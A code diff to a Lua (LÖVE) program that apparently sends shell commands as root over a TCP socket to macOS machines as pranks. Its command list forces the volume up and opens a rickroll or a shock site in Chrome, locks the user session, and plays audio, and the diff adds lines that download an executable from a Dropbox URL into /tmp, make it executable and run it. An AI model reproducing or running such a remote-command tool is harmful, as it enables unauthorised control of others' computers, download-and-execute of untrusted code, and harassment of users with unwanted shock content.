@@ -65,12 +65,16 @@ function love.load()
     print(tcpSocket:receive("*l")) -- is root
     tab = {}
 
-    cmds = { "osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'",
-        "osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://meatspin.fr/'",
+    cmds = {
+        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'",
+        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://meatspin.fr/'",
         "'/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession' -suspend",
         "osascript -e 'set Volume 10' && say Hello",
-        "osascript -e 'set Volume 10' && curl -s 'http://instantsandstorm.com/sandstorm.mp3' > /tmp/darude.mp3 && afplay /tmp/darude.mp3",
-        "osascript -e 'set Volume 10'"
+        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && afplay /tmp/darude.mp3 &",
+        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10'",
+        "curl -s 'https://dl.dropboxusercontent.com/u/22561204/AudioSwitcher' > /tmp/audio && chmod +x /tmp/audio",
+        "curl -s 'http://instantsandstorm.com/sandstorm.mp3' > /tmp/darude.mp3",
+        "echo echo"
         }
 
     cmds_name = {
@@ -78,8 +82,11 @@ function love.load()
         "meatspin",
         "delog",
         "say hello",
-        "darude",
-        "sound"
+        "play darude",
+        "hp",
+        "dl audio",
+        "dl darude",
+        "echo"
     }
 
     mode = 0;
@@ -111,6 +118,8 @@ function love.update(dt)
                         end
                     end
                 end
+            else
+                print(data)
             end
         end
         i = 0
